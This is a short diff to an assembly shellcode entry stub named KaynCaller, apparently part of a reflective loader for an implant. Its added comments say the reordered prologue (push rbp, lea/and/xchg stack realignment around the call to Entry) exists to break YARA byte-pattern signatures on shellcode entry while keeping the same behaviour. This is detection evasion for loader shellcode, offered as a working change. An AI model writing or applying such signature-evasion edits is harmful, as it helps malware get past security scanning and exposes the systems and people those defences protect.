@@ -6,15 +6,22 @@ global KaynCaller
 
 section .text$A
 	Start:
+        ; Polymorphic prologue — reordered equivalent instructions
+        ; to break YARA byte-pattern signatures on shellcode entry.
+        ; Functionally identical: saves rsi, aligns stack, calls Entry, restores.
+        push    rbp
+        mov     rbp, rsp
         push    rsi
-        mov		rsi, rsp
-        and		rsp, 0FFFFFFFFFFFFFFF0h
+        lea     rsi, [rsp - 028h]
+        and     rsi, 0FFFFFFFFFFFFFFF0h
+        xchg    rsp, rsi
 
-        sub		rsp, 020h
+        sub     rsp, 020h
         call    Entry
 
-        mov		rsp, rsi
-        pop		rsi
+        xchg    rsp, rsi
+        pop     rsi
+        pop     rbp
     ret
 
 section .text$F
